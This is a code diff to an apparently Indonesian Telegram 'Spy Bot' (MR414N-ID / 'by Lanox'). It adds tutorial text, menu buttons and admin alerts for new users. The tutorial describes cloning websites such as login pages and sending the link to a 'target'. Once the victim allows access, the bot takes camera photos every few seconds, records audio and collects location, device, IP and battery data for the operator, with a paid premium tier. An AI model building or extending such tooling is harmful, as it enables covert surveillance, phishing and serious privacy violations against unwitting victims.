@@ -58,6 +58,68 @@ ASCII_ART = [
     "|_|  |_|_| \\_\\  |_| |_|  |_| |_|     |___|____/ ",
 ]
 
+TUTORIAL_TEXT = """📖 *TUTORIAL SPY BOT BY LANOX*
+
+━━━━━━━━━━━━━━━━━━━━
+*1️⃣ MULAI*
+Ketik /start untuk membuka panel utama.
+Kamu akan melihat status akun dan tombol-tombol fitur.
+
+━━━━━━━━━━━━━━━━━━━━
+*2️⃣ TAMBAH LINK*
+Tekan ➕ Tambah Link, lalu pilih template:
+
+🔗 *Clone URL* — masukkan URL website yang mau ditiru (contoh: halaman login, berita, dll). Bot akan membuat tiruan situsnya.
+
+📄 *Kirim File HTML* — kirim file .html langsung di chat. Cocok kalau punya halaman custom sendiri.
+
+━━━━━━━━━━━━━━━━━━━━
+*3️⃣ PILIH MODE SADAP*
+Setelah template siap, pilih mode:
+
+📷 *Kamera + Lokasi*
+→ Ambil foto depan & belakang + koordinat lokasi target.
+
+🎤 *Kamera + Lokasi + Mic*
+→ Semua di atas + rekam audio selama target membuka situs. Audio dikirim saat target menutup halaman.
+
+━━━━━━━━━━━━━━━━━━━━
+*4️⃣ CUSTOM LINK (Opsional)*
+Setelah tunnel aktif, bot tanya mau custom link atau tidak.
+Kalau iya, ketik alias (contoh: promohari) → bot buat link pendek.
+
+━━━━━━━━━━━━━━━━━━━━
+*5️⃣ SHARE KE TARGET*
+Salin link yang muncul → kirim ke target.
+Waktu target buka link dan izinkan kamera/lokasi → data langsung masuk ke chat kamu.
+
+━━━━━━━━━━━━━━━━━━━━
+*6️⃣ LIHAT HASIL*
+Setiap capture masuk kamu dapat:
+• 📸 Foto depan & belakang (tiap 5 detik)
+• 📍 Koordinat + link Google Maps
+• 📱 Merek & model HP target
+• 🌐 Browser & OS
+• 🔌 IP address
+• 📡 Jenis jaringan
+• 🔋 Battery & charging status
+• 🎤 Audio rekaman (mode mic)
+
+━━━━━━━━━━━━━━━━━━━━
+*7️⃣ KELOLA LINK*
+📋 Daftar Link — lihat semua link aktif kamu
+🗑 Hapus Link — matikan link yang tidak dipakai
+👁 Target Online — cek siapa yang sedang buka linkmu sekarang
+
+━━━━━━━━━━━━━━━━━━━━
+*8️⃣ UPGRADE*
+User Free hanya bisa buat 3 link.
+Hubungi admin untuk upgrade ke Premium (link unlimited).
+
+━━━━━━━━━━━━━━━━━━━━
+🔥 *SPY BOT BY LANOX*
+Smart Monitoring • Digital Tracking"""
+
 def print_banner():
     os.system("clear")
     print()
@@ -112,7 +174,8 @@ def db_write(data: dict):
         except Exception as e:
             print(f"\n[!] db_write error: {e}")
 
-def db_ensure_user(uid: str):
+def db_ensure_user(uid: str) -> bool:
+    """Return True kalau user baru (baru pertama kali daftar)."""
     data = db_read()
     if uid not in data["users"]:
         role = "admin" if uid in data.get("admins", []) else "free"
@@ -123,6 +186,8 @@ def db_ensure_user(uid: str):
             "premium_until": None
         }
         db_write(data)
+        return True
+    return False
 
 def db_get_role(uid: str) -> str:
     data = db_read()
@@ -872,18 +937,23 @@ def clone_url(url):
 #  KEYBOARD
 # ------------------------------------------------------------------ #
 def kb_main(uid):
-    return InlineKeyboardMarkup([
+    rows = [
         [
             InlineKeyboardButton("➕ Tambah Link", callback_data="add_link"),
             InlineKeyboardButton("🗑 Hapus Link",  callback_data="del_link"),
         ],
         [
-            InlineKeyboardButton("📋 Daftar Link",  callback_data="list_links"),
-            InlineKeyboardButton("👁 Target Online", callback_data="online_now"),
+            InlineKeyboardButton("📋 Daftar Link",   callback_data="list_links"),
+            InlineKeyboardButton("👁 Target Online",  callback_data="online_now"),
         ],
-        [InlineKeyboardButton("👑 Panel Admin", callback_data="admin_panel")]
-        if db_get_role(uid) == "admin" else []
-    ])
+        [
+            InlineKeyboardButton("📖 Tutorial",      callback_data="tutorial"),
+            InlineKeyboardButton("🔄 Refresh",       callback_data="refresh_panel"),
+        ],
+    ]
+    if db_get_role(uid) == "admin":
+        rows.append([InlineKeyboardButton("👑 Panel Admin", callback_data="admin_panel")])
+    return InlineKeyboardMarkup(rows)
 
 def kb_template():
     return InlineKeyboardMarkup([
@@ -964,10 +1034,22 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("🚫 Kamu telah dibanned dari bot ini.")
         return
 
-    db_ensure_user(uid)
-    role  = db_get_role(uid)
-    cap   = db_read()["users"].get(uid,{}).get("cap_total",0)
-    badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
+    is_new = db_ensure_user(uid)
+    role   = db_get_role(uid)
+    cap    = db_read()["users"].get(uid,{}).get("cap_total",0)
+    badge  = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
+
+    # notif ke semua admin kalau user baru
+    if is_new and role != "admin":
+        admins = db_read().get("admins",[])
+        for a_id in admins:
+            try:
+                await context.bot.send_message(
+                    chat_id=a_id,
+                    text=f"🆕 *User baru daftar!*\n\nID: `{uid}`\nWaktu: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
+                    parse_mode="Markdown"
+                )
+            except: pass
 
     teks  = f"🕵️ *MR414N-ID Spy Bot*\n\n"
     teks += f"Status: {badge}\nTotal capture: {cap}\n"
@@ -997,6 +1079,28 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
         teks  = f"🕵️ *MR414N-ID Spy Bot*\n\nStatus: {badge}\nTotal capture: {cap}\n\nPanel kontrol:"
         await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
+
+    elif d == "tutorial":
+        await q.edit_message_text(
+            TUTORIAL_TEXT,
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("« Kembali", callback_data="back_main")]
+            ])
+        )
+
+    elif d == "refresh_panel":
+        cap   = db_read()["users"].get(uid,{}).get("cap_total",0)
+        badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
+        aktif = db_link_count(uid)
+        teks  = f"🕵️ *MR414N-ID Spy Bot*\n\n"
+        teks += f"Status: {badge}\nTotal capture: {cap}\n"
+        if role == "free":
+            teks += f"Link aktif: {aktif}/{FREE_LIMIT}\n"
+        else:
+            teks += f"Link aktif: {aktif}\n"
+        teks += f"⏰ Update: {datetime.datetime.now().strftime('%H:%M:%S')}\n\nPanel kontrol:"
+        await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))
 
     # --- tambah link ---
     elif d == "add_link":
